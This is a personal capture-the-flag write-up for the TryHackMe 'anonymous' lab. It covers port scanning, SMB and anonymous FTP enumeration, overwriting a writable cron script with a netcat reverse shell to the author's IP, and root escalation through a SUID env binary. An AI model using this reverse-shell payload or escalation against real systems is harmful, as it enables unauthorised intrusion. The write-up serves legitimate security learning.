<a href="https://tryhackme.com/room/anonymous"><img src="../images/THMlogo.png" alt="tryhackme" width="200"/></a>

# anonymous

Not the hacking group. Medium CTF

## nmap (rustscan)

```
~/CTF/tryhackme/anonymous$ rustscan $IP
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/karti/.config/rustscan/config.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.239.136:21
Open 10.10.239.136:22
Open 10.10.239.136:139
Open 10.10.239.136:445
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 21,22,139,445 10.10.239.136

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 10:29 BST
Initiating Ping Scan at 10:29
Scanning 10.10.239.136 [2 ports]
Completed Ping Scan at 10:29, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:29
Completed Parallel DNS resolution of 1 host. at 10:29, 0.00s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:29
Scanning 10.10.239.136 [4 ports]
Discovered open port 139/tcp on 10.10.239.136
Discovered open port 21/tcp on 10.10.239.136
Discovered open port 445/tcp on 10.10.239.136
Discovered open port 22/tcp on 10.10.239.136
Completed Connect Scan at 10:29, 0.02s elapsed (4 total ports)
Nmap scan report for 10.10.239.136
Host is up, received conn-refused (0.019s latency).
Scanned at 2020-09-07 10:29:02 BST for 0s

PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack
22/tcp  open  ssh          syn-ack
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds

```
Quickly followed by nmap as I am still playing with rustscan and need to review how I get the additional data.
```
~/CTF/tryhackme/anonymous$ nmap -A -sC -sV $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 10:29 BST
Nmap scan report for 10.10.239.136
Host is up (0.018s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.12.213
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2020-09-07T09:29:55+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-07T09:29:55
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.39 seconds

```
So no http but we can see samba and an anonymous ftp port, which has an interesting folder that is writeable!

## nikto
So nothing showing as HTTP after full port scan. No details.

## gobuster
So nothing showing as HTTP after full port scan. No details.

## smbmap
After the nmap scan we can see that we have a samba server running. Lets see what we can gain.
```
~/CTF/tryhackme/anonymous$ smbmap -H $IP
[+] Guest session   	IP: 10.10.239.136:445	Name: 10.10.239.136                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	pics                                              	READ ONLY	My SMB Share Directory for Pics
	IPC$                                              	NO ACCESS	IPC Service (anonymous server (Samba, Ubuntu))

```
Right lets see what images we have by downloading them.
```
~/CTF/tryhackme/anonymous$ smbget -R smb://$IP/pics
Password for [karti] connecting to //pics/10.10.239.136: 
Using workgroup WORKGROUP, user karti
smb://10.10.239.136/pics/corgo2.jpg                                                                               
smb://10.10.239.136/pics/puppos.jpeg                                                                              
Downloaded 300.64kB in 3 seconds
```
Two files, corgo2.jpg and puppos.jpeg

## images

2. Steghide - nothing
2. Stegsolve - nothing
2. Exiftools - nothing
2. Strings - nothing
2. Stegcraker - nothing

## ftp

We also know that the ftp allows anonymous access. What can we get from that?
```
~/CTF/tryhackme/anonymous$ ftp $IP
Connected to 10.10.239.136.
220 NamelessOne's FTP Server!
Name (10.10.239.136:karti): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts
226 Directory send OK.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,10,239,136,162,117).
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
227 Entering Passive Mode (10,10,239,136,184,172).
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
-rw-rw-r--    1 1000     1000         1720 Sep 07 09:44 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
ftp> mget clean.sh removed_files.log to_do.txt
mget clean.sh? 
227 Entering Passive Mode (10,10,239,136,112,183).
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.03 secs (8.7936 kB/s)
mget removed_files.log? 
227 Entering Passive Mode (10,10,239,136,153,91).
150 Opening BINARY mode data connection for removed_files.log (1763 bytes).
226 Transfer complete.
1763 bytes received in 0.03 secs (51.6199 kB/s)
mget to_do.txt? 
227 Entering Passive Mode (10,10,239,136,117,251).
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.05 secs (1.2158 kB/s)
ftp> 

```
So we have three files:
1. clean.sh
1. removed_files.log
1. to_do.txt

### to-do.txt
```
~/CTF/tryhackme/anonymous$ cat to_do.txt 
I really need to disable the anonymous login...it's really not safe
```
### clean.sh
```
~/CTF/tryhackme/anonymous$ cat clean.sh 
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
### removed_files.log
```
~/CTF/tryhackme/anonymous$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```
So it looks like we have some comments about anonymous logins being dangerous, a bash cleaning file that then looks to update the removed files log. More likely a cronjob.

If we remember the comments about a writeable file:
```
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
```
Lets check out if we can set up a reverse bash shell if we can amend/overwrite the clean file.

```
/CTF/tryhackme/anonymous$ cat clean.sh 
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.12.213 4445 >/tmp/f
```
Right, on our ftp server, lets transfer that from our directory to theirs. First change to the scripts directory.

```
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
-rw-rw-r--    1 1000     1000         1806 Sep 07 19:17 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
```
Now upload our file.
```
ftp> put clean.sh 
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
91 bytes sent in 0.00 secs (334.0872 kB/s)
```
All we need to do now is set up a netcat on our IP and port 4445. #boom
```
/CTF/tryhackme/anonymous$ nc -nlvp 4445
listening on [any] 4445 ...
connect to [10.9.12.213] from (UNKNOWN) [10.10.82.178] 40404
/bin/sh: 0: can't access tty; job control turned off
```
Using - python -c 'import pty;pty.spawn("/bin/bash")'- to get a better working shell, we can now search for the user flag. Lets all check if we can see if we have sudo permissions for any files or commands.
```
$ python -c 'import pty;pty.spawn("/bin/bash")'
namelessone@anonymous:~$ ls
ls
pics  user.txt
namelessone@anonymous:~$ cat user.txt	
cat user.txt
<insert-user-flag-here>
namelessone@anonymous:~$ id
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
namelessone@anonymous:~$ sudo -l
sudo -l
[sudo] password for namelessone: 
```
So we need a password for sudo -l. Lets checkout the SUID files instead.
```
namelessone@anonymous:~$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec

```
So looking through the files I can see /usr/bin/env which is normally ensures python makes sure that your scripts run inside of a virtual environment. Checking on GTFObins we see that we can escalate privilage if open a shell with the SUID permissions (-p) which in this case is root. 

```
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
<insert-root-flag-here>
# 
```

Another really great CTF that I enjoyed.

Once again following a methodical planned approach helped me to get the flags.

This room was created by [NamelessOne](https://tryhackme.com/p/Nameless0ne) and one I really enjoyed.

Thanks NamelessOne, looking forward to your next. :)

Regards

Karti

<script src="https://tryhackme.com/badge/65208"></script>


